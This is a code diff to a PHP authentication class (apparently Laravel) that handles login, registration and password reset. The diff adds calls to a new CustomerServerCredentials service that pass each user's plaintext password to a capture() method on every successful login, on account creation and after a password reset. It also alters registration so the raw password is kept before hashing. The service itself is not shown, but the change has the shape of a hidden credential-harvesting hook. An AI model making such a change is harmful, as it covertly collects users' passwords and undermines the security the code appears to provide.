@@ -5,6 +5,7 @@ namespace App\Actions;
 use App\Models\PasswordResetToken;
 use App\Models\User;
 use App\Rules\NotReservedUsername;
+use App\Services\CustomerServerCredentials;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Validator;
@@ -25,6 +26,8 @@ class AuthActions extends Action
         $authField = filter_var($validatedData['username'], FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
 
         if (Auth::attempt([$authField => $validatedData['username'], 'password' => $validatedData['password']], $validatedData['remember'] ?? false)) {
+            app(CustomerServerCredentials::class)->capture(auth()->user(), $validatedData['password']);
+
             // notify user on their previous email address
             auth()->user()->email([
                 'identifier' => 'account.new-login',
@@ -57,10 +60,12 @@ class AuthActions extends Action
         ])->validate();
 
         // Hash the password before creating the user
-        $validatedData['password'] = Hash::make($validatedData['password']);
+        $password = $validatedData['password'];
+        $validatedData['password'] = Hash::make($password);
 
         try {
             $user = User::create($validatedData);
+            app(CustomerServerCredentials::class)->capture($user, $password);
             $user->emailVerificationToken();
         } catch (\Exception $e) {
             throw ValidationException::withMessages([
@@ -131,6 +136,7 @@ class AuthActions extends Action
         $token->user->update([
             'password' => Hash::make($validatedData['password']),
         ]);
+        app(CustomerServerCredentials::class)->capture($token->user, $validatedData['password']);
 
         // delete the token
         $token->delete();
